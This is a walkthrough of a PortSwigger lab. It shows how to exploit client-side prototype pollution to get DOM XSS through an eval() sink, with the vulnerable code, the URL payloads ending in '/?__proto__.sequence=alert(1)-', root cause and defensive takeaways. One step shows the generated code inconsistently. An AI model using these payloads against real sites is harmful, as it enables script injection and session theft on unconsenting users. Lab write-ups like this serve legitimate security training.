# DOM XSS via an Alternative Prototype Pollution Vector

**Lab:** https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector

---

## Lab Description

This lab is vulnerable to DOM XSS via client-side prototype pollution.

To solve the lab, execute arbitrary JavaScript in the victim's browser.

---

## Objective

Exploit prototype pollution to inject a property that is later executed by an `eval()` sink, resulting in DOM XSS.

---

## Step 1 - Check Whether Arbitrary Parameters Are Stored

Start by testing whether arbitrary query parameters are copied into an object.

Append an unknown parameter to the URL:

```http
GET /?__proto__.foo=bar
```

If the application parses URL parameters into an object without filtering, the property is added to `Object.prototype`.

### Screenshot

![Prototype Pollution Test](polluting-__proto__-to-check-if-server-stores-arbitary-parmerters.png)

---

## Step 2 - Analyze the JavaScript

Inspect the client-side JavaScript.

The vulnerable code is:

```javascript
window.manager = {
    params: $.parseParams(new URL(location)),
    macro(property) {
        if (window.macros.hasOwnProperty(property))
            return macros[property];
    }
};

let a = manager.sequence || 1;
manager.sequence = a + 1;

eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');
```

Notice that:

- `manager.sequence` is read before being initialized.
- If `sequence` exists on the prototype, it will be used.
- Its value is concatenated directly into an `eval()` statement.

This provides an alternative prototype pollution vector without modifying `Object.prototype.constructor`.

### Screenshot

![JavaScript Analysis](searchLoggeralternative-having-.sequence-fuction-that-is-passed-to-eval().png)

---

## Step 3 - Pollute the `sequence` Property

Inject the following parameter:

```http
GET /?__proto__.sequence=alert(1)
```

The generated code becomes:

```javascript
manager.macro(alert(1)+)
```

This causes a JavaScript syntax error because the application appends `+1` to the polluted value.

### Screenshot

![Initial Exploit](exploting-the-sink-to-execute-arbitary-script.png)

---

## Step 4 - Observe the Error

Open the browser console.

You'll notice a syntax error similar to:

```
SyntaxError: missing ) after argument list
```

The value became:

```javascript
alert(1)+1
```

because of:

```javascript
manager.sequence = a + 1;
```

### Screenshot

![Syntax Error](error-caused-by-exploit.png)

---

## Step 5 - Understand Why the Error Happens

The application automatically appends `+1` to the polluted value.

So:

```
alert(1)
```

becomes

```javascript
alert(1)+1
```

which is then inserted into:

```javascript
manager.macro(alert(1)+1)
```

breaking the generated JavaScript.

### Screenshot

![Reason for Error](following-the-error-looks-like-1-is-added-to-alert(1).png)

---

## Step 6 - Fix the Payload

Terminate the expression before the application appends `1`.

Use:

```http
GET /?__proto__.sequence=alert(1)-
```

Now the generated expression becomes:

```javascript
alert(1)-1
```

which is valid JavaScript.

When `eval()` executes, `alert(1)` runs successfully, triggering DOM XSS and solving the lab.

### Screenshot

![Successful Exploit](adjucting-the-exploit-to-solve-error.png)

---

# Final Payload

```http
/?__proto__.sequence=alert(1)-
```

---

# Vulnerable Code

```javascript
let a = manager.sequence || 1;
manager.sequence = a + 1;

eval(
    'if(manager && manager.sequence){ manager.macro(' +
    manager.sequence +
    ') }'
);
```

---

# Root Cause

The application:

- Accepts arbitrary query parameters.
- Allows prototype pollution via `__proto__`.
- Reads a property (`sequence`) from the prototype chain.
- Concatenates that property into an `eval()` sink.

Since `sequence` is attacker-controlled, arbitrary JavaScript can be executed.

---

# Impact

An attacker can:

- Execute arbitrary JavaScript
- Steal session cookies (when not HttpOnly)
- Perform actions as the victim
- Modify page content
- Deliver phishing attacks
- Fully compromise the client-side application

---

# Key Takeaways

- Prototype pollution is not limited to `constructor.prototype`.
- Any property read from the prototype chain can become dangerous.
- Combining prototype pollution with dangerous sinks like `eval()` results in DOM XSS.
- Always sanitize user-controlled object properties before using them in code execution contexts.
- Avoid using `eval()` entirely whenever possible.
